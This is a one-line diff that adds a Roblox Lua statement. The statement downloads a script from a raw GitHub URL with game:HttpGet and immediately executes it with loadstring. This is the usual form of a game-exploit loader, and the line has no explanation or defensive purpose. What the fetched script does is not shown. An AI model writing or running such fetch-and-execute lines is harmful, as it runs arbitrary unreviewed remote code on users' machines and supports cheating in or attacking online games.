@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/121291/you_are_a_skid/scripts/game%3AGetService(%22fat%22).lua"))()
